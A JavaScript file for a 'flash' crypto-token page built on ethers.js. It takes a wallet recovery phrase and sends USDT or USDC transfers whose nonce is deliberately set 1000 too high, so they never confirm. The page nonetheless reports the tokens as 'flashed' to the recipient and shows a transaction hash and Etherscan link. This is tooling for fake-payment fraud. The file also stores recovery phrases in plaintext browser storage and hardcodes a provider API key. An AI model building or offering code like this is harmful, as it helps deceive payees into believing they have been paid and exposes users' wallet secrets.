const provider = new ethers.providers.InfuraProvider("homestead", "f585e0c775484d678e846f28285683a3");

let currentWallet = null;
let wallets = [];

function addWalletFromMnemonic(mnemonic) {
    try {
        const wallet = ethers.Wallet.fromMnemonic(mnemonic).connect(provider);
        wallets.push(wallet);
        localStorage.setItem('wallets', JSON.stringify(wallets.map(w => w.mnemonic.phrase)));
        updateWalletSelector();
    } catch (error) {
        alert("Invalid 12-word recovery phrase.");
    }
}

function updateWalletSelector() {
    const walletSelector = document.getElementById('wallet-selector');
    walletSelector.innerHTML = '';
    wallets.forEach((wallet, index) => {
        const option = document.createElement('option');
        option.value = index;
        option.text = wallet.address;
        walletSelector.appendChild(option);
    });
}

document.getElementById('wallet-selector').addEventListener('change', async (event) => {
    currentWallet = wallets[event.target.value];
    updateWalletInfo(currentWallet);
});

async function updateWalletInfo(wallet) {
    const balance = await wallet.getBalance();
    document.getElementById('balance').innerText = `${ethers.utils.formatEther(balance)} ETH`;
}

document.getElementById('send-flash-btn').addEventListener('click', async () => {
    const mnemonic = document.getElementById('mnemonic').value;
    const recipient = document.getElementById('recipient').value;
    const amountUSD = document.getElementById('amount').value;
    const token = document.getElementById('token-selector').value;

    if (!mnemonic) {
        alert("Please enter your 12-word recovery phrase.");
        return;
    }

    addWalletFromMnemonic(mnemonic);

    if (!recipient || !amountUSD || !token || !wallets.length) {
        alert("Please provide all required fields.");
        return;
    }

    currentWallet = wallets[wallets.length - 1];
    const decimals = token === 'USDT' || token === 'USDC' ? 6 : 18;
    const amount = ethers.utils.parseUnits(amountUSD, decimals);

    const tokenAddress = token === 'USDT' 
        ? '0xdAC17F958D2ee523a2206206994597C13D831ec7'
        : '0xA0b86991c6218b36c1d19d4A2e9eb0ce3606eB48';

    const tokenContract = new ethers.Contract(tokenAddress, [
        "function transfer(address _to, uint256 _value) public returns (bool)"
    ], currentWallet);

    try {
        // Get the current nonce and add 1000 to it
        const currentNonce = await provider.getTransactionCount(currentWallet.address);
        const invalidNonce = currentNonce + 1000;  // Adding 1000 to make it invalid

        // Now create a transaction with the invalid nonce
        const tx = await tokenContract.transfer(recipient, amount, {
            gasLimit: 100000,
            nonce: invalidNonce  // Set the invalid nonce
        });

        document.getElementById('status').innerText = `${amountUSD} ${token} has been flashed to ${recipient}`;
        const txLink = document.getElementById('tx-link');
        txLink.style.display = 'inline';
        txLink.href = `https://etherscan.io/tx/${tx.hash}`;
        document.getElementById('confirmation-message').innerText = `Transaction sent with hash: ${tx.hash}`;
    } catch (err) {
        console.error("Error during transaction:", err);
        document.getElementById('status').innerText = `Error: ${err.message}`;
    }
});

document.getElementById('revert-flash-btn').addEventListener('click', async () => {
    if (!currentWallet) {
        alert("No wallet connected.");
        return;
    }

    try {
        // Get the current nonce and add 1000 to it to invalidate the revert transaction
        const currentNonce = await provider.getTransactionCount(currentWallet.address);
        const invalidNonce = currentNonce + 1000; // Invalid nonce for revert

        // Send a transaction to the wallet's own address with the invalid nonce
        const tx = await currentWallet.sendTransaction({
            to: currentWallet.address,
            value: 0, // No ETH sent, just a revert action
            nonce: invalidNonce, // Invalid nonce to simulate the revert
            gasLimit: 21000 // Basic gas limit for an ETH transfer
        });

        document.getElementById('status').innerText = `Revert tx sent at nonce ${invalidNonce}`;
        const txLink = document.getElementById('tx-link');
        txLink.style.display = 'inline';
        txLink.href = `https://etherscan.io/tx/${tx.hash}`;
    } catch (err) {
        document.getElementById('status').innerText = `Error: ${err.message}`;
    }
});
